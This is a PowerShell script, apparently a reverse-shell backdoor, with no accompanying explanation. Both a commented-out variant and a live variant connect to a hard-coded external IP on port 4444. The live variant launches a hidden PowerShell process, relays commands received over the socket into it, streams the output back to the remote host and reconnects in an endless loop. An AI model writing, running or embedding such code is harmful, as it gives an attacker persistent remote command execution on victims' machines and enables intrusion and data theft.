# while ($true) {
#     try {
#         $client = New-Object System.Net.Sockets.TCPClient
#         $client.Connect("45.154.3.68", 4444)
#         if ($client.Connected) {
#             $stream = $client.GetStream()
#             [byte[]]$bytes = 0..65535 | % {0}
#             while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
#                 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
#                 $sendback = (iex $data 2>&1 | Out-String)
#                 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
#                 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
#                 $stream.Write($sendbyte, 0, $sendbyte.Length)
#                 $stream.Flush()
#             }
#             $client.Close()
#         }
#     } catch {
#     }
#     Start-Sleep -Seconds 10
# }

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("45.154.3.68", 4444)
        $stream = $client.GetStream()

        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.RedirectStandardInput = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true

        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        $proc.Start() | Out-Null

        $stdout = $proc.StandardOutput
        $stderr = $proc.StandardError
        $stdin = $proc.StandardInput

        Start-Job -ScriptBlock {
            param($reader, $stdin)
            while ($true) {
                $cmd = $reader.ReadLine()
                if ($cmd -eq $null) { break }
                $stdin.WriteLine($cmd)
            }
        } -ArgumentList $reader, $stdin | Out-Null

        while (-not $stdout.EndOfStream) {
            $line = $stdout.ReadLine()
            $writer.WriteLine($line)
        }

        $proc.Close()
        $client.Close()
    } catch {
    }
    Start-Sleep -Seconds 5
}
